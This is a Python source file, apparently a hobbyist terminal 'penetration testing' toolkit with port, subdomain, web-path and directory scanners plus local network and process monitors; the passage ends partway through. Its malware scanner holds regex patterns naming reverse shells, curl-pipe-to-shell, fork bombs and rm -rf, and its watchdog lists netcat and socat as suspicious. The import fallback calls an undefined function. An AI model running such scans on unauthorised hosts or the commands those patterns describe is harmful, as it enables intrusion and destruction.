#!/usr/bin/env python3
# -*- coding: utf-8 -*-


"""
╔═══════════════════════════════════════════════════════════════╗
║                   DRGXEL CyberPack v2.0                       ║
║        Professional Penetration Testing Framework            ║
║                  RELEASE EDITION 2024                         ║
╚═══════════════════════════════════════════════════════════════╝

Author: DRGXEL Security Team
License: MIT License
GitHub: https://github.com/drgxel/cyberpack
Website: https://drgxel.com

WARNING: For authorized security testing only!
"""

import os
import sys
import socket
import subprocess
import platform
import time
import re
import json
import random
import hashlib
import base64
import ssl
from datetime import datetime
from urllib.request import urlopen, Request, HTTPCookieProcessor, build_opener
from urllib.error import URLError, HTTPError
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from html.parser import HTMLParser
from http.cookiejar import CookieJar
from urllib.parse import quote

try:
    from fpdf import FPDF
    FPDF_AVAILABLE = True
except ImportError:
    FPDF_AVAILABLE = False
    print_warning("FPDF not installed. PDF reports will use text format.")
    print_info("Install with: pip install fpdf")

VERSION = "2.0"
BUILD = "20241202"
CODENAME = "RELEASE EDITION"
LOG_FILE = os.path.expanduser("~/drgxel_logs.txt")
STATS_FILE = os.path.expanduser("~/.drgxel_stats.json")

# Color codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    PURPLE = '\033[95m'

def load_stats():
    """Load usage statistics"""
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    
    return {
        'total_scans': 0,
        'total_time': 0,
        'modules_used': {},
        'targets_scanned': [],
        'vulnerabilities_found': 0,
        'first_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'last_use': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'version': VERSION
    }

def save_stats(stats):
    """Save usage statistics"""
    try:
        stats['last_use'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        stats['version'] = VERSION
        with open(STATS_FILE, 'w') as f:
            json.dump(stats, f, indent=2)
    except:
        pass

def update_stats(module_name, target=None, vuln_found=False):
    """Update statistics after module use"""
    stats = load_stats()
    stats['total_scans'] += 1
    stats['modules_used'][module_name] = stats['modules_used'].get(module_name, 0) + 1
    
    if target and target not in stats['targets_scanned']:
        stats['targets_scanned'].append(target)
        # Keep only last 50 targets
        if len(stats['targets_scanned']) > 50:
            stats['targets_scanned'] = stats['targets_scanned'][-50:]
    
    if vuln_found:
        stats['vulnerabilities_found'] += 1
    
    save_stats(stats)

def get_stats_summary():
    """Get formatted statistics summary"""
    stats = load_stats()
    return {
        'total_scans': stats.get('total_scans', 0),
        'total_modules': len(stats.get('modules_used', {})),
        'total_targets': len(stats.get('targets_scanned', [])),
        'total_vulns': stats.get('vulnerabilities_found', 0),
        'most_used': max(stats.get('modules_used', {}).items(), key=lambda x: x[1])[0] if stats.get('modules_used') else 'None',
        'first_use': stats.get('first_use', 'N/A'),
        'last_use': stats.get('last_use', 'N/A')
    }

def clear_screen():
    """Clear terminal screen"""
    os.system('clear' if os.name != 'nt' else 'cls')

def typing_effect(text, delay=0.02):
    """Print text with typing effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_animation(text="Loading", duration=1.5, style="dots"):
    """Animated loading indicator"""
    animations = {
        'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
        'bar': ['▱▱▱▱▱', '▰▱▱▱▱', '▰▰▱▱▱', '▰▰▰▱▱', '▰▰▰▰▱', '▰▰▰▰▰'],
        'pulse': ['◐', '◓', '◑', '◒'],
        'arrow': ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙'],
        'braille': ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'],
        'bounce': ['⠁', '⠂', '⠄', '⡀', '⢀', '⠠', '⠐', '⠈'],
    }
    
    frames = animations.get(style, animations['dots'])
    end_time = time.time() + duration
    i = 0
    
    while time.time() < end_time:
        frame = frames[i % len(frames)]
        sys.stdout.write(f'\r{Colors.OKCYAN}{frame}{Colors.ENDC} {text}...')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    
    sys.stdout.write('\r' + ' ' * (len(text) + 20) + '\r')
    sys.stdout.flush()

def progress_bar(current, total, bar_length=40, prefix='Progress', suffix='Complete'):
    """Display an enhanced progress bar"""
    percent = float(current) / total
    filled_length = int(bar_length * percent)
    
    # Different colors based on progress
    if percent < 0.33:
        color = Colors.FAIL
    elif percent < 0.66:
        color = Colors.WARNING
    else:
        color = Colors.OKGREEN
    
    bar = '█' * filled_length + '░' * (bar_length - filled_length)
    
    sys.stdout.write(f'\r{Colors.BOLD}{prefix}{Colors.ENDC} [{color}{bar}{Colors.ENDC}] {int(percent * 100)}% {suffix}')
    sys.stdout.flush()
    
    if current == total:
        print()

def animated_text(text, color=Colors.OKCYAN):
    """Print animated text effect"""
    clear_line = '\r' + ' ' * 80 + '\r'
    
    for i in range(len(text) + 1):
        sys.stdout.write(clear_line)
        sys.stdout.write(f'{color}{text[:i]}{Colors.ENDC}')
        sys.stdout.flush()
        time.sleep(0.05)
    print()

def print_banner():
    """Display enhanced DRGXEL banner"""
    banner = f"""
{Colors.OKCYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   {Colors.PURPLE}██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██╗{Colors.OKCYAN}               ║
║   {Colors.PURPLE}██╔══██╗██╔══██╗██╔════╝ ██║  ██║██╔════╝██║{Colors.OKCYAN}               ║
║   {Colors.PURPLE}██║  ██║██████╔╝██║  ███╗███████║█████╗  ██║{Colors.OKCYAN}               ║
║   {Colors.PURPLE}██║  ██║██╔══██╗██║   ██║╚════██║██╔══╝  ██║{Colors.OKCYAN}               ║
║   {Colors.PURPLE}██████╔╝██║  ██║╚██████╔╝     ██║███████╗███████╗{Colors.OKCYAN}          ║
║   {Colors.PURPLE}╚═════╝ ╚═╝  ╚═╝ ╚═════╝      ╚═╝╚══════╝╚══════╝{Colors.OKCYAN}          ║
║                                                               ║
║          {Colors.WARNING}CyberPack v{VERSION}{Colors.OKCYAN} - {Colors.OKGREEN}{CODENAME}{Colors.OKCYAN}              ║
║            {Colors.WHITE}Professional Security Framework{Colors.OKCYAN}              ║
║                   {Colors.GRAY}Build {BUILD}{Colors.OKCYAN}                         ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.ENDC}
"""
    print(banner)

def log_activity(message):
    """Enhanced logging with timestamps and categories"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Determine log level
        if 'error' in message.lower() or 'fail' in message.lower():
            level = '[ERROR]'
        elif 'warning' in message.lower() or 'suspicious' in message.lower():
            level = '[WARN]'
        elif 'success' in message.lower() or 'found' in message.lower():
            level = '[SUCCESS]'
        else:
            level = '[INFO]'
        
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{timestamp}] {level} {message}\n")
    except Exception as e:
        print(f"{Colors.FAIL}[!] Log error: {e}{Colors.ENDC}")

def print_success(message):
    """Print success message with icon"""
    print(f"{Colors.OKGREEN}[✓]{Colors.ENDC} {message}")

def print_error(message):
    """Print error message with icon"""
    print(f"{Colors.FAIL}[✗]{Colors.ENDC} {message}")

def print_info(message):
    """Print info message with icon"""
    print(f"{Colors.OKBLUE}[ℹ]{Colors.ENDC} {message}")

def print_warning(message):
    """Print warning message with icon"""
    print(f"{Colors.WARNING}[⚠]{Colors.ENDC} {message}")

def print_critical(message):
    """Print critical message with icon"""
    print(f"{Colors.FAIL}{Colors.BOLD}[!!!]{Colors.ENDC} {message}")

def print_section(title):
    """Print section header"""
    print(f"\n{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.WHITE}{title:^60}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}{'═' * 60}{Colors.ENDC}\n")

def print_subsection(title):
    """Print subsection header"""
    print(f"\n{Colors.WARNING}▶ {title}{Colors.ENDC}")
    print(f"{Colors.GRAY}{'─' * 60}{Colors.ENDC}")

def recon_menu():
    """Recon Scanner Menu"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ RECON SCANNER ═══\033[0m\n")
    print("1. Ping Test")
    print("2. Port Scanner")
    print("3. Subdomain Scanner")
    print("0. Back to Main Menu\n")
    
    choice = input("\033[1;33m[?] Select option: \033[0m")
    
    if choice == '1':
        ping_test()
    elif choice == '2':
        port_scanner()
    elif choice == '3':
        subdomain_scanner()
    elif choice == '0':
        return
    else:
        print_error("Invalid option!")
        time.sleep(1)
        recon_menu()

def ping_test():
    """Simple ping test"""
    print("\n\033[1;36m═══ PING TEST ═══\033[0m")
    target = input("\n[?] Enter target (IP/domain): ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    print_info(f"Pinging {target}...")
    log_activity(f"Ping test to {target}")
    
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        command = ['ping', param, '4', target]
        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
        
        print(result.stdout)
        
        if result.returncode == 0:
            print_success(f"{target} is reachable!")
        else:
            print_error(f"{target} is unreachable!")
            
    except subprocess.TimeoutExpired:
        print_error("Ping timeout!")
    except Exception as e:
        print_error(f"Ping failed: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def port_scanner():
    """Simple port scanner"""
    print("\n\033[1;36m═══ PORT SCANNER ═══\033[0m")
    target = input("\n[?] Enter target IP/domain: ").strip()
    
    if not target:
        print_error("Target cannot be empty!")
        time.sleep(2)
        return
    
    # Common ports to scan
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
    
    print_info(f"Scanning {target}...")
    print_info(f"Scanning {len(common_ports)} common ports...\n")
    log_activity(f"Port scan on {target}")
    
    open_ports = []
    
    try:
        target_ip = socket.gethostbyname(target)
        print_info(f"Resolved to: {target_ip}\n")
        
        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            
            if result == 0:
                print_success(f"Port {port} is OPEN")
                open_ports.append(port)
            else:
                print(f"Port {port} is closed", end='\r')
            
            sock.close()
        
        print("\n")
        if open_ports:
            print_success(f"Found {len(open_ports)} open ports: {open_ports}")
        else:
            print_warning("No open ports found in common port range")
            
    except socket.gaierror:
        print_error("Hostname could not be resolved!")
    except socket.error:
        print_error("Could not connect to server!")
    except Exception as e:
        print_error(f"Scan error: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def subdomain_scanner():
    """Simple subdomain scanner"""
    print("\n\033[1;36m═══ SUBDOMAIN SCANNER ═══\033[0m")
    domain = input("\n[?] Enter domain (e.g., example.com): ").strip()
    
    if not domain:
        print_error("Domain cannot be empty!")
        time.sleep(2)
        return
    
    # Internal wordlist for subdomains
    subdomains = [
        'www', 'mail', 'ftp', 'admin', 'blog', 'shop', 'api', 'dev', 
        'test', 'staging', 'beta', 'portal', 'secure', 'vpn', 'remote',
        'dashboard', 'cpanel', 'webmail', 'smtp', 'pop', 'imap', 'ns1', 
        'ns2', 'dns', 'mx', 'cdn', 'static', 'media', 'images'
    ]
    
    print_info(f"Scanning subdomains for {domain}...")
    print_info(f"Testing {len(subdomains)} common subdomains...\n")
    log_activity(f"Subdomain scan on {domain}")
    
    found = []
    
    for sub in subdomains:
        subdomain = f"{sub}.{domain}"
        try:
            socket.gethostbyname(subdomain)
            print_success(f"Found: {subdomain}")
            found.append(subdomain)
        except socket.gaierror:
            print(f"Testing: {subdomain}", end='\r')
        except Exception:
            pass
    
    print("\n")
    if found:
        print_success(f"Found {len(found)} valid subdomains!")
        for s in found:
            print(f"  • {s}")
    else:
        print_warning("No subdomains found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def web_vuln_scanner():
    """Mini-Nikto style web vulnerability scanner"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ WEB VULNERABILITY SCANNER ═══\033[0m\n")
    
    url = input("[?] Enter target URL (e.g., http://example.com): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_info(f"Scanning {url}...")
    log_activity(f"Web vuln scan on {url}")
    
    # Common vulnerable paths
    vuln_paths = [
        '/admin', '/administrator', '/login', '/wp-admin', '/phpmyadmin',
        '/cpanel', '/dashboard', '/admin.php', '/login.php', '/config.php',
        '/.git', '/.env', '/backup', '/.htaccess', '/web.config',
        '/phpinfo.php', '/info.php', '/test.php', '/debug.php',
        '/robots.txt', '/sitemap.xml', '/.well-known', '/api',
        '/upload', '/uploads', '/files', '/images', '/temp'
    ]
    
    found_paths = []
    
    print("\n")
    for path in vuln_paths:
        full_url = url.rstrip('/') + path
        try:
            req = Request(full_url, headers={'User-Agent': 'DRGXEL-Scanner/1.0'})
            response = urlopen(req, timeout=5)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{status_code}] {path}")
                found_paths.append((path, status_code))
            elif status_code in [301, 302]:
                print_warning(f"[{status_code}] {path} (Redirect)")
                found_paths.append((path, status_code))
            else:
                print(f"Testing: {path}", end='\r')
                
        except HTTPError as e:
            if e.code == 403:
                print_warning(f"[403] {path} (Forbidden)")
                found_paths.append((path, 403))
            else:
                print(f"Testing: {path}", end='\r')
        except:
            print(f"Testing: {path}", end='\r')
    
    print("\n")
    if found_paths:
        print_success(f"Found {len(found_paths)} interesting paths!")
        for path, code in found_paths:
            print(f"  • [{code}] {path}")
    else:
        print_warning("No interesting paths found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def directory_bruteforce():
    """Directory bruteforce with internal wordlist"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DIRECTORY BRUTEFORCE ═══\033[0m\n")
    
    url = input("[?] Enter target URL (e.g., http://example.com): ").strip()
    
    if not url:
        print_error("URL cannot be empty!")
        time.sleep(2)
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    # Internal wordlist
    wordlist = [
        'admin', 'administrator', 'login', 'dashboard', 'panel', 'cpanel',
        'user', 'users', 'account', 'accounts', 'profile', 'settings',
        'config', 'configuration', 'setup', 'install', 'installation',
        'backup', 'backups', 'db', 'database', 'sql', 'mysql',
        'upload', 'uploads', 'files', 'file', 'download', 'downloads',
        'images', 'img', 'image', 'media', 'assets', 'static',
        'css', 'js', 'javascript', 'styles', 'scripts',
        'api', 'v1', 'v2', 'rest', 'graphql',
        'test', 'testing', 'debug', 'dev', 'development',
        'staging', 'beta', 'alpha', 'demo',
        'docs', 'documentation', 'help', 'support',
        'blog', 'news', 'articles', 'posts',
        'shop', 'store', 'cart', 'checkout', 'products',
        'about', 'contact', 'home', 'index'
    ]
    
    print_info(f"Bruteforcing {url}...")
    print_info(f"Wordlist size: {len(wordlist)} entries\n")
    log_activity(f"Directory bruteforce on {url}")
    
    found = []
    
    for word in wordlist:
        full_url = url.rstrip('/') + '/' + word
        try:
            req = Request(full_url, headers={'User-Agent': 'DRGXEL-Scanner/1.0'})
            response = urlopen(req, timeout=3)
            status_code = response.getcode()
            
            if status_code == 200:
                print_success(f"[{status_code}] /{word}")
                found.append((word, status_code))
            else:
                print(f"Testing: /{word}", end='\r')
                
        except HTTPError as e:
            if e.code in [301, 302, 403]:
                print_warning(f"[{e.code}] /{word}")
                found.append((word, e.code))
            else:
                print(f"Testing: /{word}", end='\r')
        except:
            print(f"Testing: /{word}", end='\r')
    
    print("\n")
    if found:
        print_success(f"Found {len(found)} directories!")
        for dir_name, code in found:
            print(f"  • [{code}] /{dir_name}")
    else:
        print_warning("No directories found")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def device_info():
    """Display device information"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DEVICE INFORMATION ═══\033[0m\n")
    log_activity("Device info checked")
    
    try:
        # System Information
        print("\033[1;33m[System Information]\033[0m")
        print(f"  OS: {platform.system()} {platform.release()}")
        print(f"  Version: {platform.version()}")
        print(f"  Machine: {platform.machine()}")
        print(f"  Processor: {platform.processor()}")
        print(f"  Architecture: {platform.architecture()[0]}")
        print(f"  Hostname: {socket.gethostname()}")
        
        # CPU Information
        print("\n\033[1;33m[CPU Information]\033[0m")
        try:
            if platform.system() == "Linux":
                with open('/proc/cpuinfo', 'r') as f:
                    cpuinfo = f.read()
                    cpu_model = re.search(r'model name\s+:\s+(.+)', cpuinfo)
                    if cpu_model:
                        print(f"  Model: {cpu_model.group(1)}")
                    
                    cpu_cores = cpuinfo.count('processor')
                    print(f"  Cores: {cpu_cores}")
            else:
                print("  CPU details not available on this platform")
        except:
            print("  Unable to read CPU info")
        
        # Memory Information
        print("\n\033[1;33m[Memory Information]\033[0m")
        try:
            if platform.system() == "Linux":
                with open('/proc/meminfo', 'r') as f:
                    meminfo = f.read()
                    mem_total = re.search(r'MemTotal:\s+(\d+)', meminfo)
                    mem_free = re.search(r'MemFree:\s+(\d+)', meminfo)
                    mem_available = re.search(r'MemAvailable:\s+(\d+)', meminfo)
                    
                    if mem_total:
                        print(f"  Total RAM: {int(mem_total.group(1)) // 1024} MB")
                    if mem_free:
                        print(f"  Free RAM: {int(mem_free.group(1)) // 1024} MB")
                    if mem_available:
                        print(f"  Available RAM: {int(mem_available.group(1)) // 1024} MB")
            else:
                print("  Memory details not available on this platform")
        except:
            print("  Unable to read memory info")
        
        # Storage Information
        print("\n\033[1;33m[Storage Information]\033[0m")
        try:
            if platform.system() == "Linux":
                result = subprocess.run(['df', '-h', '/'], capture_output=True, text=True)
                lines = result.stdout.strip().split('\n')
                if len(lines) > 1:
                    parts = lines[1].split()
                    print(f"  Total: {parts[1]}")
                    print(f"  Used: {parts[2]}")
                    print(f"  Available: {parts[3]}")
                    print(f"  Usage: {parts[4]}")
            else:
                print("  Storage details not available on this platform")
        except:
            print("  Unable to read storage info")
        
        # Kernel Information
        print("\n\033[1;33m[Kernel Information]\033[0m")
        try:
            if platform.system() == "Linux":
                kernel_version = subprocess.run(['uname', '-r'], capture_output=True, text=True)
                print(f"  Version: {kernel_version.stdout.strip()}")
            else:
                print(f"  Version: {platform.release()}")
        except:
            print("  Unable to read kernel info")
        
        # Network Information
        print("\n\033[1;33m[Network Information]\033[0m")
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            print(f"  Local IP: {local_ip}")
        except:
            print("  Unable to get network info")
        
    except Exception as e:
        print_error(f"Error getting device info: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def anti_ddos_checker():
    """Check for potential DDoS activity"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ ANTI-DDOS CHECKER ═══\033[0m\n")
    log_activity("Anti-DDoS check performed")
    
    print_info("Checking for suspicious network activity...\n")
    
    try:
        if platform.system() == "Linux":
            # Check for unusual connection counts
            print("\033[1;33m[Connection Statistics]\033[0m")
            
            try:
                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
                connections = result.stdout
                
                established = connections.count('ESTABLISHED')
                time_wait = connections.count('TIME_WAIT')
                syn_recv = connections.count('SYN_RECV')
                
                print(f"  ESTABLISHED: {established}")
                print(f"  TIME_WAIT: {time_wait}")
                print(f"  SYN_RECV: {syn_recv}")
                
                # Simple heuristic for potential DDoS
                if syn_recv > 50:
                    print_warning("  ⚠ High number of SYN_RECV - possible SYN flood!")
                elif time_wait > 100:
                    print_warning("  ⚠ High number of TIME_WAIT connections")
                elif established > 200:
                    print_warning("  ⚠ Unusually high number of established connections")
                else:
                    print_success("  ✓ Connection counts appear normal")
                    
            except subprocess.TimeoutExpired:
                print_error("Netstat command timed out")
            except FileNotFoundError:
                print_error("Netstat command not found")
            
            # Check connection rate
            print("\n\033[1;33m[Connection Rate Analysis]\033[0m")
            try:
                result = subprocess.run(['ss', '-s'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    print(result.stdout)
                else:
                    print_warning("Unable to analyze connection rate")
            except:
                print_warning("ss command not available")
            
            # Check for port scan patterns
            print("\n\033[1;33m[Security Alerts]\033[0m")
            print_info("Monitoring for unusual patterns...")
            
            try:
                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                port_connections = {}
                for line in lines:
                    if 'ESTABLISHED' in line or 'SYN_RECV' in line:
                        parts = line.split()
                        if len(parts) > 4:
                            foreign_addr = parts[4]
                            ip = foreign_addr.split(':')[0]
                            if ip not in ['127.0.0.1', '0.0.0.0', '::1']:
                                port_connections[ip] = port_connections.get(ip, 0) + 1
                
                # Check for IPs with multiple connections
                suspicious = {ip: count for ip, count in port_connections.items() if count > 10}
                
                if suspicious:
                    print_warning(f"Found {len(suspicious)} IPs with multiple connections:")
                    for ip, count in list(suspicious.items())[:5]:
                        print(f"    • {ip}: {count} connections")
                else:
                    print_success("No suspicious connection patterns detected")
                    
            except Exception as e:
                print_error(f"Unable to analyze patterns: {e}")
        
        else:
            print_warning("Anti-DDoS checker is optimized for Linux systems")
            print_info("Basic network statistics:")
            
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                print(f"  Local IP: {local_ip}")
                print_info("For detailed DDoS protection, use this tool on Linux/Termux")
            except:
                print_error("Unable to get network info")
    
    except Exception as e:
        print_error(f"Error during DDoS check: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def malware_scanner():
    """Scan files for malicious patterns"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ MALWARE SCANNER ═══\033[0m\n")
    
    scan_path = input("[?] Enter path to scan (default: current directory): ").strip()
    if not scan_path:
        scan_path = "."
    
    if not os.path.exists(scan_path):
        print_error("Path does not exist!")
        time.sleep(2)
        return
    
    print_info(f"Scanning {scan_path} for malicious patterns...\n")
    log_activity(f"Malware scan on {scan_path}")
    
    # Malicious patterns to detect
    patterns = {
        'forkbomb': r':\(\)\s*\{\s*:\|\:&\s*\}\s*;',
        'rm_rf': r'rm\s+-rf\s+/',
        'curl_sh': r'curl.*\|\s*sh',
        'wget_sh': r'wget.*\|\s*sh',
        'eval_base64': r'eval.*base64',
        'nc_reverse': r'nc.*-e\s+/bin/(bash|sh)',
        'python_shell': r'import\s+pty.*pty\.spawn',
        'chmod_777': r'chmod\s+777',
        'suspicious_cron': r'crontab.*\|\s*sh',
        'password_grab': r'grep.*password',
    }
    
    suspicious_files = []
    scanned_count = 0
    
    try:
        for root, dirs, files in os.walk(scan_path):
            for file in files:
                if file.endswith(('.sh', '.py', '.php', '.pl')):
                    filepath = os.path.join(root, file)
                    scanned_count += 1
                    
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            
                            detected = []
                            for pattern_name, pattern in patterns.items():
                                if re.search(pattern, content, re.IGNORECASE):
                                    detected.append(pattern_name)
                            
                            if detected:
                                print_warning(f"Suspicious: {filepath}")
                                print(f"  Patterns: {', '.join(detected)}")
                                suspicious_files.append((filepath, detected))
                            else:
                                print(f"Scanning: {filepath}", end='\r')
                    except:
                        pass
        
        print("\n")
        print_info(f"Scanned {scanned_count} files")
        
        if suspicious_files:
            print_warning(f"\nFound {len(suspicious_files)} suspicious files!")
            print("\n\033[1;33m[Suspicious Files]\033[0m")
            for filepath, patterns in suspicious_files:
                print(f"  • {filepath}")
                print(f"    Patterns: {', '.join(patterns)}")
        else:
            print_success("No malicious patterns detected!")
    
    except Exception as e:
        print_error(f"Scan error: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def process_watchdog():
    """Monitor suspicious processes"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ PROCESS WATCHDOG ═══\033[0m\n")
    log_activity("Process watchdog check")
    
    print_info("Analyzing running processes...\n")
    
    try:
        if platform.system() == "Linux":
            # Get process list with CPU and memory usage
            print("\033[1;33m[High CPU Processes]\033[0m")
            try:
                result = subprocess.run(['ps', 'aux', '--sort=-pcpu'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')[1:11]  # Top 10
                
                for line in lines:
                    if line.strip():
                        parts = line.split(None, 10)
                        if len(parts) >= 11:
                            cpu = parts[2]
                            mem = parts[3]
                            cmd = parts[10]
                            
                            cpu_val = float(cpu) if cpu.replace('.', '').isdigit() else 0
                            
                            if cpu_val > 50:
                                print_warning(f"  CPU: {cpu}% | MEM: {mem}% | {cmd[:60]}")
                            else:
                                print(f"  CPU: {cpu}% | MEM: {mem}% | {cmd[:60]}")
            except Exception as e:
                print_error(f"Unable to get process list: {e}")
            
            # Check for suspicious process names
            print("\n\033[1;33m[Suspicious Process Names]\033[0m")
            suspicious_names = ['nc', 'ncat', 'netcat', 'socat', 'reverse', 
                              'backdoor', 'rootkit', 'miner', 'cryptominer']
            
            try:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                found_suspicious = False
                
                for line in result.stdout.split('\n'):
                    for sus_name in suspicious_names:
                        if sus_name in line.lower():
                            print_warning(f"  Suspicious: {line.strip()[:80]}")
                            found_suspicious = True
                
                if not found_suspicious:
                    print_success("  No suspicious process names detected")
            except Exception as e:
                print_error(f"Unable to check process names: {e}")
            
            # Check network connections
            print("\n\033[1;33m[Network Connections]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tunap'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                connection_count = 0
                for line in lines:
                    if 'ESTABLISHED' in line:
                        connection_count += 1
                        if connection_count <= 5:
                            print(f"  {line.strip()[:80]}")
                
                if connection_count > 5:
                    print(f"  ... and {connection_count - 5} more connections")
                
                if connection_count > 50:
                    print_warning(f"  ⚠ High number of connections: {connection_count}")
                else:
                    print_success(f"  Connection count: {connection_count}")
                    
            except FileNotFoundError:
                print_warning("  netstat command not available")
            except Exception as e:
                print_error(f"Unable to check connections: {e}")
        
        else:
            print_warning("Process Watchdog is optimized for Linux/Termux systems")
            print_info("Basic process monitoring not available on this platform")
    
    except Exception as e:
        print_error(f"Error during process monitoring: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def network_monitor():
    """Monitor network connections and ports"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ NETWORK MONITOR ═══\033[0m\n")
    log_activity("Network monitor check")
    
    print_info("Monitoring network activity...\n")
    
    try:
        if platform.system() == "Linux":
            # Listening ports
            print("\033[1;33m[Listening Ports]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tuln'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                listening_ports = []
                for line in lines:
                    if 'LISTEN' in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            local_addr = parts[3]
                            if ':' in local_addr:
                                port = local_addr.split(':')[-1]
                                listening_ports.append(port)
                                print(f"  Port {port}: LISTENING")
                
                if listening_ports:
                    print_success(f"\n  Total listening ports: {len(listening_ports)}")
                else:
                    print_info("  No listening ports detected")
                    
            except FileNotFoundError:
                print_error("  netstat command not found")
            except Exception as e:
                print_error(f"  Error: {e}")
            
            # Active connections
            print("\n\033[1;33m[Active Connections]\033[0m")
            try:
                result = subprocess.run(['netstat', '-tun'], 
                                      capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                
                connections = []
                for line in lines:
                    if 'ESTABLISHED' in line or 'SYN_SENT' in line or 'SYN_RECV' in line:
                        connections.append(line.strip())
                        if len(connections) <= 10:
                            print(f"  {line.strip()[:80]}")
                
                if len(connections) > 10:
                    print(f"  ... and {len(connections) - 10} more connections")
                
                print_info(f"\n  Total active connections: {len(connections)}")
                
            except Exception as e:
                print_error(f"  Error getting connections: {e}")
            
            # Interface statistics
            print("\n\033[1;33m[Interface Statistics]\033[0m")
            try:
                with open('/proc/net/dev', 'r') as f:
                    lines = f.readlines()[2:]  # Skip headers
                    
                    for line in lines:
                        if ':' in line:
                            parts = line.split(':')
                            iface = parts[0].strip()
                            stats = parts[1].split()
                            
                            rx_bytes = int(stats[0])
                            tx_bytes = int(stats[8])
                            
                            if rx_bytes > 0 or tx_bytes > 0:
                                rx_mb = rx_bytes / (1024 * 1024)
                                tx_mb = tx_bytes / (1024 * 1024)
                                print(f"  {iface}:")
                                print(f"    RX: {rx_mb:.2f} MB")
                                print(f"    TX: {tx_mb:.2f} MB")
            except Exception as e:
                print_error(f"  Unable to read interface stats: {e}")
            
            # DNS information
            print("\n\033[1;33m[DNS Configuration]\033[0m")
            try:
                with open('/etc/resolv.conf', 'r') as f:
                    for line in f:
                        if line.startswith('nameserver'):
                            print(f"  {line.strip()}")
            except Exception as e:
                print_error(f"  Unable to read DNS config: {e}")
        
        else:
            print_warning("Network Monitor is optimized for Linux/Termux systems")
            
            # Basic network info for other platforms
            print("\033[1;33m[Basic Network Info]\033[0m")
            try:
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)
                print(f"  Hostname: {hostname}")
                print(f"  Local IP: {local_ip}")
            except:
                print_error("  Unable to get network info")
    
    except Exception as e:
        print_error(f"Error during network monitoring: {e}")
    
    input("\n\033[1;33m[Press Enter to continue...]\033[0m")

def view_syslog():
    """View DRGXEL system logs"""
    clear_screen()
    print_banner()
    print("\033[1;36m═══ DRGXEL SYSLOG ═══\033[0m\n")
    
    if not os.path.exists(LOG_FILE):
        print_warning(f"Log file not found: {LOG_FILE}")
        print_info("No logs have been recorded yet.")
